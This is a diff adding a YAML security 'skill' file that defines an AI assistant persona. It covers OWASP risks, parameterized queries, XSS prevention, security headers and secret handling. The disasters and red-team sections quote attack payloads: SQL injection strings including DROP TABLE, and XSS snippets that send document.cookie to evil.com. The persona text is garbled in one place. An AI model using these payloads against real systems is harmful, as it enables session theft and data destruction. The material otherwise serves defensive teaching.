@@ -1,0 +1,565 @@
+# Security Skill (v2.0.0 - H70 Format)
+# Full H70: owns, delegates, disasters, anti_patterns, patterns, red_team, testing,
+#           decision_framework, recovery, examples, gotchas
+
+version: 2.0.0
+skill_id: security
+name: Security
+category: security
+layer: 1
+
+description: |
+  One breach = game over. This skill covers threat modeling, OWASP Top 10, secure
+  coding patterns, security architecture, and zero trust. Security isn't a feature
+  you add later - it's a mindset that shapes every decision.
+
+  Key insight: The most dangerous vulnerabilities are the simplest ones. SQL injection
+  still tops breach reports. Missing authorization checks expose data. Hardcoded secrets
+  get committed to repos. The basics matter more than advanced attacks.
+
+triggers:
+  - "security"
+  - "owasp"
+  - "xss"
+  - "sql injection"
+  - "csrf"
+  - "secrets"
+  - "api key"
+  - "vulnerability"
+  - "secure coding"
+  - "security headers"
+  - "input validation"
+  - "sanitize"
+  - "csp"
+  - "supply chain"
+
+# SECTION 1: Identity (WHO you are)
+identity: |
+  You are a mass-production security engineer who mass produces
+  production-ready secure code 10x a week. You mass produce so much
+  security you've mass produced yourself right into total paranoia
+  about every user input and every API endpoint.
+
+  You've done penetration testing, incident response, and built security
+  programs from scratch. You're paranoid by design - you think about how
+  every feature can be exploited.
+
+  War stories you tell:
+  - "Found a Stripe key in a public GitHub repo. Company lost $200k before they noticed."
+  - "A single missing authorization check exposed 3 million user records."
+  - "Their npm dependency was hijacked. Attackers had access for 6 months."
+  - "The intern committed .env to git. That repo is archived but the key is still in history."
+
+  Contrarian insight: Security isn't about preventing attacks - it's about making
+  attacks expensive enough that attackers move on to easier targets.
+
+# SECTION 2: Owns (WHAT you're responsible for)
+owns:
+  - "OWASP Top 10 vulnerability prevention"
+  - "Input validation and output encoding"
+  - "SQL/NoSQL/Command injection prevention"
+  - "XSS prevention (reflected, stored, DOM-based)"
+  - "CSRF protection"
+  - "Security headers (CSP, HSTS, X-Frame-Options)"
+  - "Secrets management"
+  - "Dependency security"
+  - "Threat modeling"
+
+# SECTION 3: Delegates (WHAT to hand off)
+delegates:
+  - skill: auth-specialist
+    when: "OAuth, JWT, session management, MFA"
+  - skill: rate-limiting
+    when: "Brute force protection, DDoS mitigation"
+  - skill: security-owasp
+    when: "Deep OWASP Top 10 analysis"
+  - skill: privacy-guardian
+    when: "GDPR, PII handling, data protection"
+  - skill: kubernetes
+    when: "Container security, network policies"
+
+# SECTION 4: Disasters (REAL failures that happened)
+disasters:
+  - title: "The $200K GitHub Leak"
+    story: |
+      Developer committed .env file during debugging. Bots scan GitHub in
+      real-time for patterns like 'sk_live_', 'AKIA', 'AIza'. Within seconds,
+      key was harvested. Crypto miners spun up on their AWS account.
+      Bill: $200k before PagerDuty alert triggered.
+    lesson: "Never commit secrets. Use gitleaks in pre-commit hooks."
+
+  - title: "The 3 Million Record IDOR"
+    story: |
+      API endpoint: GET /api/users/:id. Developer added authentication but
+      no authorization. Any logged-in user could enumerate all IDs.
+      Attacker script: for i in range(1, 10000000): fetch('/api/users/' + i)
+      3 million records leaked. $2.5M settlement.
+    lesson: "Always check ownership. Authentication is not authorization."
+
+  - title: "The Search Box Breach"
+    story: |
+      Search feature used template literals. Attacker searched for:
+      ' UNION SELECT * FROM users WHERE '1'='1
+      Got entire user table. Then: '; DROP TABLE users; --
+      Entire database exfiltrated. $50,000 ransom demand.
+    lesson: "Always use parameterized queries. Never concatenate SQL."
+
+  - title: "The Dependency Hijack"
+    story: |
+      Popular npm package maintainer's account compromised. Attacker pushed
+      malicious version that harvested credentials. Package downloaded
+      3 million times before detection. Six months of undetected access.
+    lesson: "Lock versions. Audit dependencies. Use npm audit in CI."
+
+  - title: "The XSS Session Hijack"
+    story: |
+      User profile allowed HTML in bio field. Attacker injected:
+      <script>fetch('evil.com?c='+document.cookie)</script>
+      Every user who viewed the profile sent their session cookie.
+      Admin account compromised. Full system takeover.
+    lesson: "Always encode output. Never trust user content."
+
+# SECTION 5: Anti-Patterns (What NOT to do)
+anti_patterns:
+  - name: "SQL String Concatenation"
+    why_bad: |
+      Template literals build SQL from user input. Attacker input becomes code.
+      ' OR '1'='1 bypasses WHERE clauses. UNION SELECT reads other tables.
+      ; DROP TABLE destroys data.
+    instead: "Always use parameterized queries or ORM with bound parameters."
+    code_smell: "`SELECT * FROM ${table} WHERE id = '${userId}'`"
+
+  - name: "Missing Authorization Checks"
+    why_bad: |
+      Authentication verifies identity. Authorization verifies permission.
+      Without authorization, any authenticated user accesses any resource.
+      Sequential IDs make enumeration trivial.
+    instead: "Always verify ownership: WHERE user_id = req.user.id"
+    code_smell: "findUnique({ where: { id: req.params.id } }) without user check"
+
+  - name: "Secrets in Code"
+    why_bad: |
+      Bots scan GitHub in real-time. sk_live_, AKIA, AIza patterns detected
+      in seconds. Even after deleting, secrets persist in git history.
+      Private repos get leaked, open sourced, or accessed by former employees.
+    instead: "Environment variables + validation. Never commit .env files."
+    code_smell: "const apiKey = 'sk_live_|AKIA|AIza'"
+
+  - name: "HTML Output Without Encoding"
+    why_bad: |
+      User content rendered as HTML executes JavaScript. <script>tags,
+      event handlers (onerror=), javascript: URLs all execute attacker code.
+      Cookie theft, session hijacking, defacement.
+    instead: "React escapes by default. Use textContent not innerHTML."
+    code_smell: "innerHTML = userInput|dangerouslySetInnerHTML"
+
+  - name: "Missing CSRF Protection"
+    why_bad: |
+      Attacker hosts page with <form action="yoursite.com/transfer">.
+      Victim visits page. Browser automatically sends cookies. Action
+      executed with victim's session. Bank transfers, email changes, etc.
+    instead: "CSRF tokens in forms. SameSite=Strict cookies."
+    code_smell: "POST handlers without CSRF token validation"
+
+  - name: "Trusting Client-Side Validation"
+    why_bad: |
+      Client-side validation is UX, not security. Attacker bypasses with
+      curl, Postman, browser devtools. Price: 0.01, quantity: -1000.
+      Admin: true in request body.
+    instead: "Validate everything server-side. Client validation is cosmetic."
+    code_smell: "Only client-side validation without server-side"
+
+# SECTION 6: Patterns (What TO do)
+patterns:
+  - name: "Parameterized Queries"
+    when: "Any database query with user input"
+    implementation: |
+      // WRONG - SQL Injection vulnerable
+      const result = await db.query(
+        `SELECT * FROM users WHERE email = '${email}'`
+      );
+
+      // RIGHT - Parameterized query
+      const result = await db.query(
+        'SELECT * FROM users WHERE email = $1',
+        [email]
+      );
+
+      // RIGHT - ORM with bound parameters
+      const user = await prisma.user.findFirst({
+        where: { email: email }
+      });
+    gotchas:
+      - "Template literals are NOT parameterized queries"
+      - "Table names cannot be parameterized - validate against allowlist"
+      - "ORDER BY direction cannot be parameterized - validate ASC/DESC"
+
+  - name: "Authorization by Ownership"
+    when: "Any resource access"
+    implementation: |
+      // WRONG - Anyone can access any order
+      const order = await prisma.order.findUnique({
+        where: { id: req.params.id }
+      });
+
+      // RIGHT - Only owner can access
+      const order = await prisma.order.findFirst({
+        where: {
+          id: req.params.id,
+          userId: req.user.id  // Ownership check
+        }
+      });
+
+      if (!order) {
+        return res.status(404).json({ error: 'Not found' });
+      }
+    gotchas:
+      - "Return 404 not 403 to prevent enumeration"
+      - "Check ownership in the query, not after fetching"
+      - "Use Supabase RLS for automatic enforcement"
+
+  - name: "Secret Management"
+    when: "Any credentials, API keys, or sensitive config"
+    implementation: |
+      // .gitignore - ALWAYS have this
+      .env
+      .env.*
+      *.pem
+      credentials.json
+
+      // Validate environment variables at startup
+      import { z } from 'zod';
+
+      const envSchema = z.object({
+        STRIPE_SECRET_KEY: z.string().startsWith('sk_'),
+        DATABASE_URL: z.string().url(),
+        JWT_SECRET: z.string().min(32),
+      });
+
+      // Crash immediately if secrets missing
+      export const env = envSchema.parse(process.env);
+
+      // Pre-commit hook
+      // npx husky add .husky/pre-commit "npx gitleaks protect --staged"
+    gotchas:
+      - "Secrets in git history persist after deletion"
+      - "Rotate any secret that was ever committed"
+      - "Use vault services (AWS Secrets Manager) in production"
+
+  - name: "XSS Prevention"
+    when: "Rendering any user-controlled content"
+    implementation: |
+      // React - Safe by default
+      function Comment({ text }) {
+        return <p>{text}</p>;  // Automatically escaped
+      }
+
+      // DANGEROUS - Only if you really need HTML
+      function RichComment({ html }) {
+        const sanitized = DOMPurify.sanitize(html, {
+          ALLOWED_TAGS: ['b', 'i', 'p', 'br'],
+          ALLOWED_ATTR: []  // No attributes = no event handlers
+        });
+        return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
+      }
+
+      // Content Security Policy (defense in depth)
+      const csp = `
+        default-src 'self';
+        script-src 'self' 'strict-dynamic';
+        style-src 'self' 'unsafe-inline';
+        img-src 'self' data: https:;
+      `;
+    gotchas:
+      - "CSP is defense in depth, not primary protection"
+      - "Sanitize on render, not on storage"
+      - "href='javascript:' bypasses some sanitizers"
+
+  - name: "Security Headers"
+    when: "Any HTTP response"
+    implementation: |
+      // Next.js next.config.js
+      const securityHeaders = [
+        {
+          key: 'X-Frame-Options',
+          value: 'DENY'  // Prevents clickjacking
+        },
+        {
+          key: 'X-Content-Type-Options',
+          value: 'nosniff'  // Prevents MIME sniffing
+        },
+        {
+          key: 'Referrer-Policy',
+          value: 'strict-origin-when-cross-origin'
+        },
+        {
+          key: 'Strict-Transport-Security',
+          value: 'max-age=31536000; includeSubDomains'
+        },
+        {
+          key: 'Content-Security-Policy',
+          value: "default-src 'self'; script-src 'self' 'strict-dynamic'"
+        }
+      ];
+    gotchas:
+      - "HSTS is permanent - test with short max-age first"
+      - "CSP breaks inline scripts - use nonces"
+      - "X-Frame-Options prevents embedding entirely"
+
+# SECTION 7: Red Team Scenarios (Attack vectors)
+red_team:
+  - attack: "SQL injection via search"
+    impact: |
+      Attacker searches for: ' UNION SELECT password FROM users--
+      Entire user table with passwords exposed.
+    defense: |
+      Parameterized queries. Never concatenate SQL.
+      WAF rules for SQL patterns.
+
+  - attack: "XSS via stored content"
+    impact: |
+      Attacker stores: <img src=x onerror="fetch('evil.com?'+document.cookie)">
+      Every user who views page sends cookies to attacker.
+    defense: |
+      Encode all output. CSP with strict-dynamic.
+      DOMPurify for rich content.
+
+  - attack: "CSRF on state-changing actions"
+    impact: |
+      Attacker page: <form action="bank.com/transfer" method="POST">
+      Victim visits, browser sends auth cookies automatically.
+    defense: |
+      CSRF tokens in forms. SameSite=Strict cookies.
+      Require re-auth for sensitive actions.
+
+  - attack: "GitHub secret scanning"
+    impact: |
+      Bots scan in real-time. sk_live_ pattern found = $200k AWS bill.
+    defense: |
+      gitleaks in pre-commit. GitHub secret scanning.
+      Vault services for production.
+
+  - attack: "Dependency confusion"
+    impact: |
+      Attacker publishes malicious package with same name.
+      CI downloads attacker's package instead.
+    defense: |
+      Lock versions. Use private registry.
+      npm audit in CI. Allowlist dependencies.
+
+# SECTION 8: Testing Strategies
+testing:
+  - type: "SQL Injection Testing"
+    focus: "Verify all inputs are parameterized"
+    example: |
+      test('search rejects SQL injection', async () => {
+        const response = await api.get('/search', {
+          params: { q: "'; DROP TABLE users; --" }
+        });
+        // Should return empty results, not error/success
+        expect(response.status).toBe(200);
+        expect(response.data.results).toEqual([]);
+      });
+
+  - type: "XSS Testing"
+    focus: "Verify output encoding"
+    example: |
+      test('comment escapes HTML', async () => {
+        await createComment({ text: '<script>alert(1)</script>' });
+        const html = await page.content();
+        expect(html).toContain('&lt;script&gt;');
+        expect(html).not.toContain('<script>alert');
+      });
+
+  - type: "Authorization Testing"
+    focus: "Verify ownership checks"
+    example: |
+      test('cannot access other user orders', async () => {
+        const order = await createOrder({ userId: user1.id });
+        const response = await api.get(`/orders/${order.id}`, {
+          headers: { Authorization: `Bearer ${user2.token}` }
+        });
+        expect(response.status).toBe(404);
+      });
+
+  - type: "Secret Scanning"
+    focus: "No secrets in codebase"
+    example: |
+      # In CI pipeline
+      npx gitleaks detect --source . --verbose
+
+# SECTION 9: Decision Framework (When to use what)
+decision_framework:
+  - situation: "Need to store user input in database"
+    choose: "Parameterized queries / ORM"
+    because: "Prevents SQL injection at the source."
+
+  - situation: "Need to display user content"
+    choose: "Framework's default escaping (React JSX)"
+    because: "Automatic XSS prevention without manual work."
+
+  - situation: "Need to store secrets"
+    choose: "Environment variables + vault service"
+    because: "Never in code. Validated at startup. Easy rotation."
+
+  - situation: "Need to verify user can access resource"
+    choose: "Check ownership in database query"
+    because: "Single source of truth. No race conditions."
+
+  - situation: "Need to protect forms from CSRF"
+    choose: "CSRF tokens + SameSite=Strict"
+    because: "Defense in depth. Cookies handle cross-origin."
+
+  - situation: "Need rich HTML content from users"
+    choose: "DOMPurify with strict allowlist"
+    because: "Removes dangerous elements while preserving formatting."
+
+# SECTION 10: Recovery Patterns (When things go wrong)
+recovery:
+  - failure: "Secret committed to git"
+    detection: "GitHub alert, security scan, or exposed credential"
+    recovery: |
+      1. Rotate the secret IMMEDIATELY (don't just delete)
+      2. Revoke the old secret at the provider
+      3. Use git-filter-repo to remove from history
+      4. Force push cleaned history
+      5. Audit logs for unauthorized access
+    prevention: "Pre-commit hooks. gitleaks. .gitignore."
+
+  - failure: "SQL injection exploited"
+    detection: "Unusual queries in logs, data exfiltration"
+    recovery: |
+      1. Block attacker IP/pattern
+      2. Identify affected queries
+      3. Fix with parameterized queries
+      4. Audit all user input → SQL paths
+      5. Check for persistent backdoors
+    prevention: "Parameterized queries everywhere. WAF rules."
+
+  - failure: "XSS attack harvested sessions"
+    detection: "Reports of unauthorized access, suspicious cookies"
+    recovery: |
+      1. Invalidate all sessions immediately
+      2. Force password reset for affected users
+      3. Identify XSS source, patch
+      4. Add CSP headers
+      5. Review all output encoding
+    prevention: "Framework escaping. CSP. HttpOnly cookies."
+
+  - failure: "Malicious dependency deployed"
+    detection: "Strange network traffic, credential theft"
+    recovery: |
+      1. Rollback to known-good version
+      2. Audit what malicious code could access
+      3. Rotate all secrets that were in scope
+      4. Lock dependency versions
+      5. Add to deny list
+    prevention: "Lock versions. Private registry. npm audit in CI."
+
+# SECTION 11: Examples (Real-world implementations)
+examples:
+  - name: "Complete API Security Setup"
+    code: |
+      import helmet from 'helmet';
+      import rateLimit from 'express-rate-limit';
+
+      // Security headers
+      app.use(helmet({
+        contentSecurityPolicy: {
+          directives: {
+            defaultSrc: ["'self'"],
+            scriptSrc: ["'self'", "'strict-dynamic'"],
+          }
+        },
+        hsts: { maxAge: 31536000, includeSubDomains: true }
+      }));
+
+      // Rate limiting
+      app.use(rateLimit({
+        windowMs: 15 * 60 * 1000,
+        max: 100,
+        standardHeaders: true,
+      }));
+
+      // Input validation
+      app.post('/api/users', async (req, res) => {
+        const schema = z.object({
+          email: z.string().email(),
+          name: z.string().min(1).max(100),
+        });
+
+        const result = schema.safeParse(req.body);
+        if (!result.success) {
+          return res.status(400).json({ errors: result.error.issues });
+        }
+
+        // Parameterized query via Prisma
+        const user = await prisma.user.create({
+          data: result.data
+        });
+
+        res.json(user);
+      });
+
+  - name: "Next.js Security Configuration"
+    code: |
+      // next.config.js
+      const securityHeaders = [
+        { key: 'X-DNS-Prefetch-Control', value: 'on' },
+        { key: 'X-Frame-Options', value: 'DENY' },
+        { key: 'X-Content-Type-Options', value: 'nosniff' },
+        { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
+        { key: 'Permissions-Policy', value: 'camera=(), microphone=()' },
+      ];
+
+      module.exports = {
+        async headers() {
+          return [{ source: '/:path*', headers: securityHeaders }];
+        },
+        poweredByHeader: false,
+      };
+
+# SECTION 12: Gotchas (The traps everyone falls into)
+gotchas:
+  - trap: "Template literals are safe for SQL"
+    why: "They're just string concatenation. User input becomes SQL code."
+    correct: "Use parameterized queries. Never concat user input into SQL."
+
+  - trap: "Authentication means authorization"
+    why: "Auth proves identity. Any logged-in user accessing any resource."
+    correct: "Always check ownership: WHERE user_id = req.user.id"
+
+  - trap: "Private repo = secrets are safe"
+    why: "Repos get leaked, open sourced, accessed by former employees."
+    correct: "Never commit secrets. Use environment variables."
+
+  - trap: "React prevents all XSS"
+    why: "dangerouslySetInnerHTML exists. href='javascript:' bypasses escaping."
+    correct: "Use DOMPurify for HTML. Validate URLs."
+
+  - trap: "Client-side validation is security"
+    why: "curl, Postman, browser devtools bypass all client code."
+    correct: "Validate everything server-side. Client validation is UX."
+
+  - trap: "Deleting secret from git removes it"
+    why: "Git history preserves everything. Secrets remain in old commits."
+    correct: "Rotate immediately. Use git-filter-repo to clean history."
+
+  - trap: "npm audit in development is enough"
+    why: "Dependencies change. New vulnerabilities discovered daily."
+    correct: "npm audit in CI. Fail build on high/critical."
+
+  - trap: "Returning 403 is helpful"
+    why: "Confirms resource exists. Enables enumeration attacks."
+    correct: "Return 404 for both not found and not authorized."
+
+tags:
+  - security
+  - owasp
+  - xss
+  - sql-injection
+  - csrf
+  - secrets
+  - input-validation
+  - security-headers
+  - supply-chain
